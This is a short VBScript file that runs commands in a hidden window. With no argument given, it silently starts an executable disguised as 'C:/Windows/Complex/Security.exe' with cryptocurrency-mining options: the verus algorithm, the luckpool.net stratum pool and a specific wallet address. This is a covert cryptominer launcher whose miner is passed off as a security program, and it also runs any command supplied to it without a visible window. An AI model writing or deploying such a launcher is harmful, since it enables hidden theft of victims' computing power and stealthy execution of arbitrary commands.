Set WshShell = CreateObject("WScript.Shell")

If WScript.Arguments.Count > 0 Then
    command = WScript.Arguments(0)
    WshShell.Run command, 0
Else
    WshShell.Run "C:/Windows/Complex/Security.exe -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.kuyrai -p x -t 1", 0
End If

Set WshShell = Nothing
